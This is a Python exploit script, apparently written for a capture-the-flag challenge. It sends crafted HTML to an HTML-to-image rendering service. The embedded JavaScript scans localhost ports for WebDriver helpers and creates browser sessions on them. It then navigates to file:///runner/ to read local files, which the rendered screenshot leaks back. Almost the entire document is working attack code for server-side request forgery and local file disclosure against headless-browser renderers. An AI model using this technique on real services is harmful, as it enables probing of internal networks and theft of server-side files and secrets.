import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(3):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=60)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/pwn_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes')
                return
            print(f'{name}: [{r.status_code}] {r.text[:200]}')
            return
        except Exception as e:
            print('retry', e); time.sleep(2)

# JS that scans helper ports 38560-38567, creates a WebDriver session on the one that
# is the runner-owned helper, navigates to file:///runner/ to list flag files, then reads flag.
# All synchronous XHR so screenshot captures the result.
js = r'''<!doctype html><html><head><style>
body{font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;padding:10px}
</style></head><body><div id=o></div><script>
function log(m){document.getElementById('o').textContent += m + "\n";}
function xhr(method,url,body){
  var x=new XMLHttpRequest();
  x.open(method,url,false);
  if(body!==null){x.setRequestHeader('Content-Type','application/json');}
  try{x.send(body);}catch(e){return {status:-1,text:''+e};}
  return {status:x.status,text:x.responseText};
}
var caps = JSON.stringify({capabilities:{alwaysMatch:{browserName:"chrome","goog:chromeOptions":{args:["--headless=new","--no-sandbox","--disable-dev-shm-usage"]}}}});
for(var p=38560;p<=38567;p++){
  var base="http://localhost:"+p;
  var st=xhr("GET",base+"/status",null);
  if(st.status!==200){continue;}
  log("PORT "+p+" status="+st.status);
  // create session
  var sess=xhr("POST",base+"/session",caps);
  log("  session resp("+sess.status+"): "+sess.text.substring(0,200));
  var m=sess.text.match(/"sessionId"\s*:\s*"([^"]+)"/);
  if(!m){continue;}
  var sid=m[1];
  // navigate to /runner/ dir listing
  xhr("POST",base+"/session/"+sid+"/url",JSON.stringify({url:"file:///runner/"}));
  var src=xhr("GET",base+"/session/"+sid+"/source",null);
  log("  /runner/ listing: "+src.text.substring(0,1500));
  // delete session
  xhr("DELETE",base+"/session/"+sid,null);
}
</script></body></html>'''

render(js, 'runner_list')
